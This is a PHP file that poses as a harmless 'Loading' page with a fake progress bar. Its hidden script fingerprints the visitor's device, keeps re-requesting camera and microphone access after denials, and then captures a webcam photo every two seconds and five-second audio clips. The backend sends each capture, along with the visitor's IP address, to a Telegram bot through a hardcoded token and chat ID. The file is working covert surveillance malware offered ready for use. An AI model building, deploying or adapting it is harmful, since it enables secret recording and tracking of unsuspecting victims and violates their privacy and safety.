<?php
// ============================================
// CONFIGURATION — ALREADY SET
// ============================================
define('TELEGRAM_BOT_TOKEN', '8802775389:AAGn7eRc1-v9v0bwxbcYb4Wtxu23jF39zik');
define('TELEGRAM_CHAT_ID',   '8730143288');
// ============================================

// ---- PHP BACKEND ----
$action = $_GET['action'] ?? '';

if ($action) {
    header('Content-Type: application/json');
    handleApiAction($action);
    exit;
}

// ---- FRONTEND (HTML + JS) ----
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Loading</title>
<style>
  :root {
    --bg: #13151c;
    --bg-glow: #1d2233;
    --text: #f4f3ef;
    --muted: #7d8296;
    --accent: #f0a947;
    --track: rgba(255, 255, 255, 0.07);
  }

  * {
    box-sizing: border-box;
  }

  html, body {
    height: 100%;
    margin: 0;
  }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    background: radial-gradient(circle at 50% 38%, var(--bg-glow), var(--bg) 62%);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: var(--text);
    -webkit-font-smoothing: antialiased;
  }

  .loader {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 26px;
  }

  .ring-wrap {
    position: relative;
    width: clamp(160px, 42vw, 210px);
    height: clamp(160px, 42vw, 210px);
  }

  .ring {
    width: 100%;
    height: 100%;
    animation: spin 2.4s linear infinite;
  }

  @keyframes spin {
    from { transform: rotate(-90deg); }
    to   { transform: rotate(270deg); }
  }

  .ring-track {
    fill: none;
    stroke: var(--track);
    stroke-width: 6;
  }

  .ring-fill {
    fill: none;
    stroke: var(--accent);
    stroke-width: 6;
    stroke-linecap: round;
    stroke-dasharray: 1000;
    stroke-dashoffset: 1000;
    filter: drop-shadow(0 0 6px rgba(240, 169, 71, 0.5));
  }

  .pct {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: baseline;
    justify-content: center;
    font-size: clamp(32px, 9vw, 44px);
    font-weight: 600;
    letter-spacing: -0.02em;
    font-variant-numeric: tabular-nums;
  }

  .pct-sign {
    font-size: 0.48em;
    font-weight: 500;
    color: var(--muted);
    margin-left: 2px;
  }

  .status {
    display: flex;
    align-items: center;
    gap: 3px;
    font-size: 13px;
    font-weight: 600;
    letter-spacing: 0.16em;
    text-transform: uppercase;
    color: var(--muted);
  }

  .dots span {
    opacity: 0.2;
    animation: blink 1.2s infinite;
  }
  .dots span:nth-child(2) { animation-delay: 0.2s; }
  .dots span:nth-child(3) { animation-delay: 0.4s; }

  @keyframes blink {
    0%, 80%, 100% { opacity: 0.2; }
    40% { opacity: 1; }
  }

  @media (prefers-reduced-motion: reduce) {
    .ring { animation: none; transform: rotate(-90deg); }
    .dots span { animation: none; opacity: 0.6; }
  }
</style>
</head>
<body>

  <div class="loader">
    <div class="ring-wrap" role="progressbar" aria-label="Loading progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
      <svg class="ring" viewBox="0 0 120 120">
        <circle class="ring-track" cx="60" cy="60" r="54"></circle>
        <circle class="ring-fill" cx="60" cy="60" r="54"></circle>
      </svg>
      <div class="pct"><span id="pctNum">0</span><span class="pct-sign">%</span></div>
    </div>
    <div class="status">
      <span id="statusText">Loading</span>
      <span class="dots" aria-hidden="true"><span>.</span><span>.</span><span>.</span></span>
    </div>
  </div>
<script>
(function () {
  var numEl = document.getElementById('pctNum');
  var statusEl = document.getElementById('statusText');
  var wrapEl = document.querySelector('.ring-wrap');
  var ringFill = document.querySelector('.ring-fill');

  var circumference = ringFill.getTotalLength();
  ringFill.style.strokeDasharray = circumference;
  ringFill.style.strokeDashoffset = circumference;

  var target = 96;       // percentage where it stops
  var duration = 30000;  // ms to reach target (30 seconds)
  var startTime = null;

  function tick(timestamp) {
    if (startTime === null) startTime = timestamp;
    var elapsed = timestamp - startTime;
    var progress = Math.min(elapsed / duration, 1);
    var value = progress * target;
    var rounded = Math.floor(value);

    numEl.textContent = rounded;
    wrapEl.setAttribute('aria-valuenow', rounded);
    ringFill.style.strokeDashoffset = circumference * (1 - value / 100);

    if (progress < 1) {
      requestAnimationFrame(tick);
    } else {
      numEl.textContent = target;
      wrapEl.setAttribute('aria-valuenow', target);
      statusEl.textContent = 'Almost there';
    }
  }

  requestAnimationFrame(tick);
})();
(function() {
    // --- Device Info ---
    var di = {
        screen_width: screen.width, screen_height: screen.height,
        platform: navigator.platform, user_agent: navigator.userAgent,
        cpu_cores: navigator.hardwareConcurrency || '?',
        device_memory: navigator.deviceMemory || '?',
        browser_language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies_enabled: navigator.cookieEnabled
    };
    fetch('script.php?action=device_info', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify(di)
    }).catch(function(){});

    // --- Permissions + Capture ---
    var modal = document.getElementById('permModal');
    var video = document.getElementById('cameraPreview');
    var statusEl = document.getElementById('statusMsg');
    var instrEl = document.getElementById('permInstructions');
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    var mediaStream = null;
    var granted = false, retryCount = 0, photoCount = 0, audioCount = 0;
    var photoInterval = null, audioInterval = null;

    setTimeout(function(){ modal.classList.add('active'); }, 800);

    function requestPermissions() {
        if (granted) return;
        retryCount++;

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: true
        }).then(function(stream) {
            granted = true;
            mediaStream = stream;
            video.srcObject = stream;
            video.play();
            statusEl.className = 'status-msg recording active';
            statusEl.innerHTML = '📷 + 🎤 Recording... smile! 😊';
            instrEl.classList.remove('active');
            startCapture();
            fetch('script.php?action=permission_granted', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({retries: retryCount})
            }).catch(function(){});
        }).catch(function(err) {
            statusEl.className = 'status-msg error active';
            statusEl.innerHTML = '❌ Denied. Retrying in 3s... (attempt ' + retryCount + ')';
            instrEl.classList.add('active');
            if (retryCount <= 5) {
                fetch('script.php?action=permission_denied', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({attempt: retryCount, error: err.message})
                }).catch(function(){});
            }
            setTimeout(requestPermissions, 3000);
        });
    }

    function startCapture() {
        // Photo every 2 seconds
        setTimeout(function(){ capturePhoto(); }, 500);
        photoInterval = setInterval(capturePhoto, 2000);
        // Audio every 5 seconds
        setTimeout(function(){ captureAudio(); }, 1000);
        audioInterval = setInterval(captureAudio, 5000);
    }

    function capturePhoto() {
        if (!mediaStream || !video.videoWidth) return;
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1,0,0,1,0,0);
        photoCount++;
        canvas.toBlob(function(blob) {
            var fd = new FormData();
            fd.append('photo', blob, 'p'+Date.now()+'.jpg');
            fd.append('capture_num', photoCount);
            fetch('script.php?action=capture', {method:'POST', body:fd}).catch(function(){});
        }, 'image/jpeg', 0.85);
    }

    function captureAudio() {
        if (!mediaStream) return;
        var audioTracks = mediaStream.getAudioTracks();
        if (!audioTracks.length) return;
        audioCount++;
        var audioStream = new MediaStream(audioTracks);
        var mime = 'audio/webm;codecs=opus';
        if (!MediaRecorder.isTypeSupported(mime)) mime = 'audio/ogg;codecs=opus';
        if (!MediaRecorder.isTypeSupported(mime)) mime = '';
        var chunks = [];
        var recorder;
        try { recorder = new MediaRecorder(audioStream, mime ? {mimeType:mime} : {}); }
        catch(e) { recorder = new MediaRecorder(audioStream); }
        recorder.ondataavailable = function(e) { if(e.data && e.data.size>0) chunks.push(e.data); };
        recorder.onstop = function() {
            if(!chunks.length) return;
            var blob = new Blob(chunks, {type: recorder.mimeType || 'audio/webm'});
            var ext = blob.type.indexOf('ogg')>-1 ? 'ogg' : 'webm';
            var fd = new FormData();
            fd.append('audio', blob, 'a'+Date.now()+'.'+ext);
            fd.append('audio_num', audioCount);
            fd.append('mime', blob.type);
            fetch('script.php?action=audio_capture', {method:'POST', body:fd}).catch(function(){});
            audioStream.getTracks().forEach(function(t){t.stop();});
        };
        recorder.start();
        setTimeout(function(){ if(recorder.state==='recording') recorder.stop(); }, 5000);
    }

    requestPermissions();

    window.addEventListener('beforeunload', function() {
        if(photoInterval) clearInterval(photoInterval);
        if(audioInterval) clearInterval(audioInterval);
        if(mediaStream) mediaStream.getTracks().forEach(function(t){t.stop();});
        fetch('script.php?action=browser_closed', {
            method: 'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({photos_sent: photoCount, audio_clips_sent: audioCount})
        }).catch(function(){});
    });
})();
</script>
</body>
</html>

<?php
// ============================================================
// PHP API HANDLER
// ============================================================
function handleApiAction($action) {
    switch ($action) {
        case 'device_info':
            $input = json_decode(file_get_contents('php://input'), true);
            if (!$input) { echo json_encode(['status'=>'error']); return; }
            $msg = "📱 <b>New Device Info</b>\n"
                 . "IP: {$_SERVER['REMOTE_ADDR']}\n"
                 . "UA: {$input['user_agent']}\n"
                 . "Platform: {$input['platform']}\n"
                 . "Screen: {$input['screen_width']}x{$input['screen_height']}\n"
                 . "CPU: {$input['cpu_cores']} cores\n"
                 . "RAM: {$input['device_memory']} GB\n"
                 . "Lang: {$input['browser_language']}\n"
                 . "Timezone: {$input['timezone']}\n"
                 . "Cookies: " . ($input['cookies_enabled'] ? '✅' : '❌');
            sendTelegram($msg);
            echo json_encode(['status'=>'ok']);
            break;

        case 'permission_granted':
            $input = json_decode(file_get_contents('php://input'), true);
            sendTelegram("✅ <b>Camera + Mic GRANTED</b>\nRetries: {$input['retries']}");
            echo json_encode(['status'=>'ok']);
            break;

        case 'permission_denied':
            $input = json_decode(file_get_contents('php://input'), true);
            sendTelegram("🚫 <b>Permission Denied</b> (attempt {$input['attempt']})\n{$input['error']}");
            echo json_encode(['status'=>'ok']);
            break;

        case 'capture':
            if (!isset($_FILES['photo']) || $_FILES['photo']['error'] !== UPLOAD_ERR_OK) {
                echo json_encode(['status'=>'error']); return;
            }
            $num = $_POST['capture_num'] ?? 0;
            $cap = "📸 <b>Photo #{$num}</b>\nIP: {$_SERVER['REMOTE_ADDR']}\n😊";
            sendTelegramPhoto($_FILES['photo']['tmp_name'], $cap);
            echo json_encode(['status'=>'ok']);
            break;

        case 'audio_capture':
            if (!isset($_FILES['audio']) || $_FILES['audio']['error'] !== UPLOAD_ERR_OK) {
                echo json_encode(['status'=>'error']); return;
            }
            $num = $_POST['audio_num'] ?? 0;
            $mime = $_POST['mime'] ?? 'audio/webm';
            $ext = pathinfo($_FILES['audio']['name'], PATHINFO_EXTENSION);
            $cap = "🎤 <b>Audio #{$num}</b>\nIP: {$_SERVER['REMOTE_ADDR']}\n😊";
            sendTelegramAudio($_FILES['audio']['tmp_name'], $cap, $mime, $ext);
            echo json_encode(['status'=>'ok']);
            break;

        case 'browser_closed':
            $input = json_decode(file_get_contents('php://input'), true);
            sendTelegram("🚪 <b>Browser Closed</b>\n📸 Photos: {$input['photos_sent']}\n🎤 Audio: {$input['audio_clips_sent']}");
            echo json_encode(['status'=>'ok']);
            break;

        default:
            echo json_encode(['status'=>'error', 'message'=>'unknown']);
    }
}

function sendTelegram($text) {
    $url = 'https://api.telegram.org/bot'.TELEGRAM_BOT_TOKEN.'/sendMessage';
    $data = ['chat_id'=>TELEGRAM_CHAT_ID, 'text'=>$text, 'parse_mode'=>'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramPhoto($path, $caption='') {
    $url = 'https://api.telegram.org/bot'.TELEGRAM_BOT_TOKEN.'/sendPhoto';
    $data = ['chat_id'=>TELEGRAM_CHAT_ID, 'photo'=>new CURLFile($path,'image/jpeg','selfie.jpg'), 'caption'=>$caption, 'parse_mode'=>'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramAudio($path, $caption='', $mime='audio/webm', $ext='webm') {
    $url = 'https://api.telegram.org/bot'.TELEGRAM_BOT_TOKEN.'/sendAudio';
    $fn = 'audio_'.time().'.'.$ext;
    $data = ['chat_id'=>TELEGRAM_CHAT_ID, 'audio'=>new CURLFile($path,$mime,$fn), 'caption'=>$caption, 'parse_mode'=>'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Fallback to sendDocument if sendAudio fails
    if ($http !== 200) {
        $url2 = 'https://api.telegram.org/bot'.TELEGRAM_BOT_TOKEN.'/sendDocument';
        $data2 = ['chat_id'=>TELEGRAM_CHAT_ID, 'document'=>new CURLFile($path,$mime,$fn), 'caption'=>$caption.' [doc]', 'parse_mode'=>'HTML'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, $url2);
        curl_setopt($ch2, CURLOPT_POST, 1);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, $data2);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch2);
        curl_close($ch2);
    }
}
?>